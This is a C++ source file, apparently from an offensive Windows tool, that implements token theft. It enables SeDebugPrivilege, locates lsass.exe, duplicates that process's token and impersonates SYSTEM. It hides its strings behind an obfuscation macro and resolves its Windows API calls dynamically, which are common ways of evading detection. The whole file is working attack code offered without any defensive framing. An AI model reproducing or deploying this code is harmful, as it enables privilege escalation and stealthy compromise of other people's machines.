#include "Impersonator.h"
#include "Config.h"
#include "DynamicAPI.h"
#include "../core/Obfuscation.h"
#include "../../DebugLog.h"
#include <tlhelp32.h>
namespace Utils {
    Impersonator::Impersonator() {
        if (!DynAPI::OpenProcToken || !DynAPI::LookupPrivValueA || !DynAPI::AdjustTokPrivs) return;
        SLOG("    [*] Attempting to enable SeDebugPrivilege...");
        if (!EnablePrivilege(S("SeDebugPrivilege").c_str())) {
            SLOG("    [-] Failed to enable SeDebugPrivilege.");
            return;
        }
        SLOG("    [+] SeDebugPrivilege enabled.");
        DWORD pid = GetProcessIdByName(S("lsass.exe").c_str());
        if (pid == 0) {
            SLOG("    [-] Could not find lsass.exe PID.");
            return;
        }
        SLOG("    [*] lsass.exe PID: %lu", pid);
        HANDLE hProcess = DynAPI::OpenProc(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!hProcess) {
            SLOG("    [-] Failed to open lsass.exe (Error: %lu)", GetLastError());
            return;
        }
        HANDLE hToken = NULL;
        if (DynAPI::OpenProcToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken)) {
            HANDLE hDupToken = NULL;
            if (DynAPI::DupTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenImpersonation, &hDupToken)) {
                if (DynAPI::ImpersonateLoggedUser(hDupToken)) {
                    _impersonating = true;
                    SLOG("    [+] Successfully impersonated SYSTEM via lsass.exe");
                } else {
                    SLOG("    [-] ImpersonateLoggedOnUser failed (Error: %lu)", GetLastError());
                }
                DynAPI::CloseH(hDupToken);
            } else {
                SLOG("    [-] DuplicateTokenEx failed (Error: %lu)", GetLastError());
            }
            DynAPI::CloseH(hToken);
        } else {
            SLOG("    [-] OpenProcessToken failed (Error: %lu)", GetLastError());
        }
        DynAPI::CloseH(hProcess);
    }
    Impersonator::~Impersonator() {
        if (_impersonating && DynAPI::RevertSelf) {
            DynAPI::RevertSelf();
        }
    }
    bool Impersonator::EnablePrivilege(LPCSTR privilege) {
        HANDLE hToken;
        LUID luid;
        TOKEN_PRIVILEGES tp;
        if (!DynAPI::OpenProcToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
            return false;
        if (!DynAPI::LookupPrivValueA(NULL, privilege, &luid)) {
            DynAPI::CloseH(hToken);
            return false;
        }
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        bool res = DynAPI::AdjustTokPrivs(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
        DWORD err = GetLastError();
        DynAPI::CloseH(hToken);
        return res && (err == ERROR_SUCCESS);
    }
    bool Impersonator::IsAdmin() {
        bool isAdmin = false;
        HANDLE hToken = NULL;
        if (DynAPI::OpenProcToken && DynAPI::OpenProcToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elevation;
            DWORD size = sizeof(TOKEN_ELEVATION);
            if (DynAPI::GetTokenInf && DynAPI::GetTokenInf(hToken, TokenElevation, &elevation, sizeof(elevation), &size)) {
                isAdmin = elevation.TokenIsElevated;
            }
            DynAPI::CloseH(hToken);
        }
        return isAdmin;
    }
    DWORD Impersonator::GetProcessIdByName(LPCSTR name) {
        if (!DynAPI::CreateSnapshot || !DynAPI::Proc32First || !DynAPI::Proc32Next) return 0;
        DWORD pid = 0;
        HANDLE hSnap = DynAPI::CreateSnapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap != INVALID_HANDLE_VALUE) {
            PROCESSENTRY32 pe;
            pe.dwSize = sizeof(pe);
            if (DynAPI::Proc32First(hSnap, &pe)) {
                do {
                    if (lstrcmpiA(pe.szExeFile, name) == 0) {
                        pid = pe.th32ProcessID;
                        break;
                    }
                } while (DynAPI::Proc32Next(hSnap, &pe));
            }
            DynAPI::CloseH(hSnap);
        }
        return pid;
    }
}
